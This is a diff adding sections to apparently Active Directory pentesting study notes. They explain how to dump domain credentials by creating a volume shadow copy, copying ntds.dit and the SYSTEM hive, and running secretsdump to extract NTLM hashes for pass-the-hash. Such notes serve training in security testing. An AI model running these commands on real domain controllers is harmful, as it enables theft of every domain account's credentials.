@@ -389,7 +389,39 @@ WriteDACL on the domain naming context lets a principal modify the domain object
 
 PowerShell uses `;` to separate commands in a one-liner. `&&` is a Bash-style separator and is not reliable in the Windows PowerShell version commonly found on older domain controllers.
 
+## Flight: VSS fallback when Kerberos DCSync is blocked
+
+`vssadmin create shadow /for=C:` creates a read-only snapshot of the volume. Copying `Windows\NTDS\ntds.dit` from the snapshot avoids the live database lock. The matching `SYSTEM` hive contains the boot key needed to decrypt the database locally.
+
+```cmd
+vssadmin create shadow /for=C:
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<N>\Windows\NTDS\ntds.dit C:\Windows\Temp\ntds.dit
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<N>\Windows\System32\config\SYSTEM C:\Windows\Temp\sys2.save
+impacket-secretsdump LOCAL -ntds ntds.dit -system sys2.save -just-dc-ntlm
+```
+
+Use the shadow-copy number printed by the current command. This path requires SYSTEM, and the copy commands are safest from `cmd.exe` because PowerShell treats the `?` path specially.
+
 #### Tags: #CommandBreakdowns #ActiveDirectory #ACLAbuse #PSCredential #SetDomainObject #ExtraSids #Rubeus #dsquery #GoldenTicket #SilverTicket #DCSync #PtH #DRSProtocol #Mimikatz #HTBSupplementary #Module22 #Module23 #LDAPSearch #DirectorySearcher #ADSI #samAccountType #WMI #CIMSession #DCOM #ShadowCopy #vshadow #NTDS #secretsdump #LateralMovement #Module24 #NTLMRelay #ntlmrelayx #comsvcs #MiniDump #pypykatz #LSASS #LateralMovement #Module27 #AssemblingThePieces #AccountOperators #ExchangeWindowsPermissions #bloodyAD #ASREPRoasting
+## Flight: secretsdump LOCAL with NTDS and SYSTEM
+
+```bash
+secretsdump.py LOCAL -ntds ntds.dit -system sys2.save -just-dc-ntlm
+```
+
+- `LOCAL` means parse files on the current machine instead of connecting to a domain controller.
+- `-ntds` points to the copied `ntds.dit` database.
+- `-system` points to the matching SYSTEM hive, which supplies the boot key used to decrypt the database.
+- `-just-dc-ntlm` skips Kerberos keys and returns only NTLM hashes, which is enough for pass-the-hash.
+
+## Flight: vssadmin creates a readable point-in-time copy
+
+```cmd
+vssadmin create shadow /for=C:
+```
+
+This creates a point-in-time snapshot of C:. Locked files such as `ntds.dit` can then be copied through the shadow device path. The command requires SYSTEM on the target.
+
 ## External Resources
 
 - [HackTricks - Pentesting Index](https://hacktricks.wiki/en/index.html)
